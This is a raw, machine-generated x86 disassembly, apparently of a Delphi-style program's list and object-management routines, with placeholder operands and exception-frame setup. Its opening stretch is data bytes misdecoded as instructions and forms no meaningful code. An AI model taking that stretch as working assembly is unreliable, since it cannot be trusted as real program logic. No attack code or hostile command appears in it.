inc ecx
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax - 0x27ffbe1e ] cl
fild [ ecx ]
sub al 0xe3
inc ecx
add [ esp + ebx * 8 ] bh
inc ecx
add [ edx ] ch
inc ecx
add ah ah
jecxz r-xdata
add [ eax - 0x23 ] ah
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
fcomp st3
inc ecx
add [ esp + ebx * 8 ] ah
je r-xdata
insd
popad
insd
rcl [ edi + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
xchg edi eax
inc ecx
add [ eax + eax ] dl
add [ eax ] al
inc ecx
add [ esp + ebx * 8 ] bh
inc ecx
add [ edx ] ch
inc ecx
add al dh
in eax 0x41
add [ edx + 0x41 ] ah
add [ eax - 0x23 ] ah
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
sbb [ eax ] al
add [ eax ] al
clc
outsd
jb r-xdata
add [ edx + 0x41 ] ah
pushad
fld [ ecx ]
pop eax
jecxz r-xdata
je r-xdata
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
xchg esi eax
inc ecx
add al bl
xor eax 0x35e40040
popad
insd
mov eax eax
cmp al 0x98
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x68 ] bl
inc ecx
add [ eax ] bl
add [ eax ] al
add al bh
push ebx
push ebx
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax - 0x27ffbe1b ] bh
fild [ ecx ]
and al 0xdc
in al 0x35
add [ 0x6d654d54 ] cl
add [ eax - 0x23 ] ah
inc ecx
add [ eax - 0x1d ] bl
inc ecx
inc ecx
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
sub_419d1c
ficomp [ ecx + eax * 2 ]
add [ ebp + ebx * 4 - 0x61e7ffbf ] dl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x800419d ] ah
sahf
inc ecx
add [ eax ] dh
add [ eax ] al
add ah ch
pop [ ecx ]
sbb [ edx + 0x42 ] al
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
hlt
sub_419dce
inc edx
add [ eax - 0x2fffbdc2 ] bh
inc edx
add [ edi + edi ] al
inc edx
add ah dl
inc edx
add ah bl
inc edx
add al ah
inc edx
add ah ch
inc edx
add [ eax - 0x53ffbdc1 ] bl
aas
inc edx
add al cl
inc ecx
inc edx
add al bl
inc edx
add [ esi + edi + 0x3ea80042 ] bh
inc edx
add al dh
inc ecx
inc edx
add [ edx ] cl
push esp
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x9e
outsb
outsb
je r-xdata
add [ esp + eax * 2 + 0x42 ] dl
add [ eax ] cl
aas
arpl [ ecx + 0x63 ] ax
je r-xdata
add [ eax ] al
adc [ eax ] al
std
sbb [ esi + 0xa070041 ] bl
push esp
inc ebx
outsd
insd
jo r-xdata
[ edi + 0x5e ]
pop ebx
retn
arpl [ ecx + 0x63 ] ax
je sub_41a008
inc edx
add [ eax ] al
inc eax
inc edx
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ eax + 0x14004243 ] dh
inc ebp
inc edx
add [ eax + 0x4c004244 ] bh
inc esp
inc edx
add [ esp + eax * 2 + 0x42 ] bh
add [ eax + 0x44 ] dl
inc edx
add [ esp + eax * 2 + 0x10042 ] bl
out dx eax
inc [ eax + 0xc004244 ]
push esp
inc edx
popad
jae r-xdata
or [ edi ] bh
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x4400408d
lahf
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x419f ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx * 4 - 0x606bffbf ] cl
inc ecx
add [ eax + eax ] dl
add [ eax ] bl
popfd
inc ecx
add [ eax ] bl
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
hlt
inc ecx
add [ eax + eax ] dl
add [ eax ] al
xor [ ecx ] dl
inc eax
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ ebx + eax * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
sahf
outsb
outsb
je r-xdata
outsd
outsb
lea eax [ eax ]
test al 0x9f
inc ecx
add [ edi ] al
or al 0x54
inc edx
popad
jae sub_41a018
add [ eax ] al
add [ eax ] al
add [ eax ] al
popfd
inc ecx
add [ eax - 0x70 ] ah
inc ecx
add [ edx ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
arpl [ ecx + 0x63 ] ax
je r-xdata
inc edx
add [ eax ] al
inc ebx
inc edx
add [ eax ] bh
inc ebx
inc edx
add [ eax + 0x6c004243 ] bl
inc ebx
inc edx
add [ ebx + eax * 2 + 0x42bc0042 ] bl
inc edx
add [ eax + 0x43 ] dl
inc edx
add [ ebx + eax * 2 + 0x54100042 ] ah
inc edx
popad
jae r-xdata
add ah ah
xor eax 0x35e80040
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
add al 0x43
jae r-xdata
push edi
mov edi ecx
mov esi edx
mov ebx eax
outsd
outsb
inc esp
lahf
inc ecx
add [ esi + ebx * 4 ] dl
inc ecx
add [ edx ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
pushfd
inc ecx
add [ eax ] cl
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040000 ] al
popad
insd
push esp
adc [ eax ] al
or al 0x0
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add edx [ ecx + 0x67 ]
lea eax [ eax ]
les ebx [ esi + 0x41 ]
add [ esp + ebx * 4 ] ah
pop ebx
pop ebp
retn 0x8
jae r-xdata
add [ ebx + 0x419fd0c0 ] cl
add [ esi ] cl
push cs
push esp
dec ecx
outsb
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406364
pop edi
pop esi
or al 0x50
popad
jo r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ebx eax
outsb
je r-xdata
inc ebp
or [ eax - 0x75 ] dl
iretd
jns r-xdata
adc [ eax ] al
add al 0x0
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
sub_419ff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406380
pop edi
pop esi
pop ebx
retn
sub_41a018
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406364
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41a040
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4063a0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41a138
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_41b654
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_4035bc
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_4035bc
test al al
je r-xdata
sub_41a198
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_41a138
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41a138
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4035bc
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41a208
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403360
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_41b4f8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_41a284
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
mov eax [ esi + 0x4 ]
call sub_403390
mov eax [ esi + 0x8 ]
call sub_403390
mov eax [ esi + 0xc ]
call sub_403390
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_41a2c4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_41b654
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_4032f4
test al al
jne r-xdata
sub_41a324
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_41b654
mov edx eax
mov eax ebp
call sub_4035bc
test al al
jne r-xdata
sub_41a368
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a403
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4032e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404384
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41a2c4
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41b4f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a40a
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
sub_41a428
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_405508
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_41a448
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_41b654
mov edx edi
call sub_41a428
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_41b654
mov edx edi
call sub_41a428
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_41b544
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_41a428
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_41b544
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_41a4ec
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_41b654
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_41a324
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_41a538
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403360
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a208
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41b4f8
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_41a5ac
push ebx
push esi
push edi
push ebp
call sub_40375c
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403744
mov eax [ esi + 0x4 ]
mov edx edi
call sub_41b654
call sub_403390
inc edi
dec ebp
jne r-xdata
sub_41a608
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_41b654
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_41a198
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_41a64c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_41a2c4
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_41b654
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_41a690
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_41a713
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4032e0
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a71a
lea eax [ ebp - 0x10c ]
call sub_404120
retn
sub_41a720
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a608
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_41a12c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_41a690
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_41b654
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41b654
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4035bc
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_41a608
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41b544
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_41b4f8
sub_41a80c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41b654
mov edx ebp
call sub_41a410
test al al
jne r-xdata
sub_41a850
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a208
mov edx eax
mov eax [ edi + 0x4 ]
call sub_41b4f8
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41b654
mov eax [ eax + 0xc ]
mov edx ebp
call sub_41b6b0
test eax eax
jge r-xdata
sub_41a8ac
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41b654
mov esi eax
mov edx ebp
mov eax esi
call sub_41a448
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403390
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41b544
sub_41a8fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403360
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_41a7e8
xor eax eax
push ebp
push sub_41a9fb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aa02
mov eax [ rw-data ]
call sub_41a8a0
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41b4f8
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_41b654
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_41a324
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41b4f8
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_41b654
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_41aa02
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_41aa28
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_41aa58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_41a7e8
xor edx edx
push ebp
push sub_41aacf
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a8a0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403c08
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41b654
mov edx [ ebp - 0x4 ]
call sub_41a2c4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41aaec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41ab4c
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ab53
lea eax [ ebp - 0xc ]
call sub_404120
retn
sub_41ab58
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41a7e8
xor eax eax
push ebp
push sub_41ab9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_41a64c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aba5
mov eax [ rw-data ]
call sub_41a8a0
retn
sub_41abac
push ebx
push esi
mov esi eax
mov eax esi
call sub_41ab58
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_41aaec
sub_41abcc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41a7e8
xor eax eax
push ebp
push sub_41ac31
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_41a80c
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_41a7f4
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ac38
mov eax [ rw-data ]
call sub_41a8a0
retn
mov eax ebx
call sub_40331c
mov ebx eax
sub_41ac3c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41a7e8
xor eax eax
push ebp
push sub_41ac7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_41a8ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ac85
mov eax [ rw-data ]
call sub_41a8a0
retn
sub_41ac88
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41a7e8
xor eax eax
push ebp
push sub_41acca
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_41a850
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41acd1
mov eax [ rw-data ]
call sub_41a8a0
retn
sub_41acd4
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_41a7e8
xor eax eax
push ebp
push sub_41ad1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_41a720
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ad22
mov eax [ rw-data ]
call sub_41a8a0
retn
sub_41ad28
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41a7e8
xor eax eax
push ebp
push sub_41ad76
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
